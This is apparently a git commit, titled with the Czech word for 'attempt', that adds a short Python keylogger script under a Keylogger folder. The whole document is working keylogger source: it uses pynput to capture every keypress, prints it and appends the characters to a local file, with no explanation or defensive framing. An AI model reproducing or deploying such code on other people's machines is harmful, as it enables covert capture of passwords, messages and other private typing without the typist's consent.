8c0a6d8a9174408ebe0cec645ccbdc8e973bd950
Scream316 <Scream316@gmail.com>
2023-11-12 12:37:27 +0100

    pokus

---
+++ Python/Keylogger/logger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def keysPressed(key):
+    print(str(key))
+    with open("kfile.txt", "a") as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error char")
+            
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keysPressed)
+    listener.start()
+    input()
